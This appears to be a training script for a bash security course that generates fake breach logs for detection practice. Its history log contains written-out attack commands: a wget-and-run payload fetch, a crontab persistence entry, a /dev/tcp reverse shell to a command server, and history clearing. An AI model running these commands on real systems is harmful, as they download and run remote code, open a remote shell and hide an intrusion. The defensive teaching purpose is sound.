#!/bin/bash

set -euo pipefail

BASE_DIR="${1:-$HOME/bash-cyber-course/logs}"

AUTH_LOG="${BASE_DIR}/auth.log"
ACCESS_LOG="${BASE_DIR}/access.log"
SYS_LOG="${BASE_DIR}/syslog"
HISTORY_LOG="${BASE_DIR}/bash_history.log"
NET_LOG="${BASE_DIR}/network.log"

ATTACKER_IP="185.220.101.4"
SECONDARY_IP="91.134.14.73"
C2_IP="45.77.88.2"
LATERAL_IP="10.0.0.15"
COMPROMISED_USER="admin"

echo "[+] Generating advanced breach logs in ${BASE_DIR}"

mkdir -p "${BASE_DIR}"

: > "${AUTH_LOG}"
: > "${ACCESS_LOG}"
: > "${SYS_LOG}"
: > "${HISTORY_LOG}"
: > "${NET_LOG}"

echo "[+] Stage 0/10: Generating normal background activity"
for ((i=1; i<=160000; i++)); do
	ip="192.168.$((RANDOM % 255)).$((RANDOM % 255))"

	printf 'Jul 10 08:%02d:%02d server sshd[%d]: Failed password for root from %s port %d ssh2\n' \
		"$((RANDOM % 60))" "$((RANDOM % 60))" "$RANDOM" "$ip" "$RANDOM" >> "${AUTH_LOG}"

	printf '%s - - [10/Jul/2024:08:%02d:%02d] "GET /index.html HTTP/1.1" 200\n' \
		"$ip" "$((RANDOM % 60))" "$((RANDOM % 60))" >> "${ACCESS_LOG}"

	printf 'Jul 10 08:%02d:%02d server systemd[%d]: Started user service\n' \
		"$((RANDOM % 60))" "$((RANDOM % 60))" "$RANDOM" >> "${SYS_LOG}"

	printf 'ls\ncd /var/www\n' >> "${HISTORY_LOG}"
	printf 'Connection from %s to 192.168.1.1:443\n' "$ip" >> "${NET_LOG}"
done

echo "[+] Stage 1/10: SSH brute force"
for ((i=1; i<=450; i++)); do
	printf 'Jul 10 09:%02d:%02d server sshd[%d]: Failed password for %s from %s port %d ssh2\n' \
		"$((RANDOM % 10))" "$((RANDOM % 60))" "$RANDOM" "$COMPROMISED_USER" "$ATTACKER_IP" "$RANDOM" >> "${AUTH_LOG}"
done

echo "[+] Stage 2/10: Successful compromise"
cat >> "${AUTH_LOG}" <<EOF
Jul 10 09:16:10 server sshd[1426]: Accepted password for ${COMPROMISED_USER} from ${ATTACKER_IP} port 45518 ssh2
Jul 10 09:18:11 server sshd[1430]: session opened for user ${COMPROMISED_USER}
EOF

echo "[+] Stage 3/10: Privilege escalation"
cat >> "${HISTORY_LOG}" <<EOF
sudo su -
whoami
id
EOF
echo "Jul 10 09:17:02 server sudo: admin : TTY=pts/0 ; COMMAND=/bin/su -" >> "${SYS_LOG}"

echo "[+] Stage 4/10: Malware download"
cat >> "${HISTORY_LOG}" <<EOF
wget http://malicious.site/payload.sh
chmod +x payload.sh
./payload.sh
EOF
echo "Jul 10 09:18:11 server kernel: outbound connection to ${C2_IP}" >> "${SYS_LOG}"

echo "[+] Stage 5/10: Persistence"
echo "echo '* * * * * /tmp/payload.sh' >> /etc/crontab" >> "${HISTORY_LOG}"
echo "Jul 10 09:19:11 server CRON[1500]: (root) CMD (/tmp/payload.sh)" >> "${SYS_LOG}"

echo "[+] Stage 6/10: Web reconnaissance and data targeting"
cat >> "${ACCESS_LOG}" <<EOF
${ATTACKER_IP} - - [10/Jul/2024:09:19:01] "GET /admin HTTP/1.1" 200
${ATTACKER_IP} - - [10/Jul/2024:09:19:02] "GET /config HTTP/1.1" 403
${ATTACKER_IP} - - [10/Jul/2024:09:19:03] "GET /.env HTTP/1.1" 403
${ATTACKER_IP} - - [10/Jul/2024:09:22:12] "GET /backup.zip HTTP/1.1" 200
${SECONDARY_IP} - - [10/Jul/2024:09:20:12] "GET /login HTTP/1.1" 404
EOF

echo "[+] Stage 7/10: Lateral movement"
echo "ssh root@${LATERAL_IP}" >> "${HISTORY_LOG}"
echo "Jul 10 09:20:01 server sshd[1550]: Accepted password for root from 192.168.1.10 port 55433 ssh2" >> "${SYS_LOG}"

echo "[+] Stage 8/10: Reverse shell"
echo "bash -i >& /dev/tcp/${C2_IP}/4444 0>&1" >> "${HISTORY_LOG}"
echo "Jul 10 09:21:15 server kernel: suspicious outbound connection to ${C2_IP}:4444" >> "${SYS_LOG}"
echo "Connection from 192.168.1.5 to ${C2_IP}:4444" >> "${NET_LOG}"

echo "[+] Stage 9/10: Cleanup attempts"
echo "history -c" >> "${HISTORY_LOG}"
echo "Jul 10 09:23:01 server bash: history cleared" >> "${SYS_LOG}"

echo "[+] Stage 10/10: Breach dataset complete"

echo
echo "Generated logs:"
echo "- ${AUTH_LOG}"
echo "- ${ACCESS_LOG}"
echo "- ${HISTORY_LOG}"
echo "- ${SYS_LOG}"
echo "- ${NET_LOG}"
echo
echo "Suggested validation commands:"
echo "grep 'Failed password' ${AUTH_LOG} | awk '{print \$11}' | sort | uniq -c | sort -nr | head"
echo "grep 'Accepted password' ${AUTH_LOG}"
echo "grep -E 'wget|/dev/tcp|history -c' ${HISTORY_LOG}"
echo "grep -E 'CRON|outbound connection' ${SYS_LOG}"